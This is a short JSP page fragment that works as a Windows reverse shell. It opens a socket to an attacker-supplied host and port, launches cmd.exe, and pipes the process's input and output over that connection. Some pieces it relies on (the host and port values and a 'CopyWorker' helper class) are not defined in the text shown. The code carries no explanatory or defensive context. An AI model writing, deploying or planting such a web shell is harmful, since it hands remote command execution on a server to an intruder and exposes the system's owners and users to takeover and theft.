<%@ page import="java.io.*, java.net.*" %>
<%
Socket peer = new Socket(host, port);
Runtime engine = Runtime.getRuntime();
Process child = engine.exec("cmd.exe");
Object a = new CopyWorker(child.getInputStream(), peer.getOutputStream());
Object b = new CopyWorker(peer.getInputStream(), child.getOutputStream());
%>
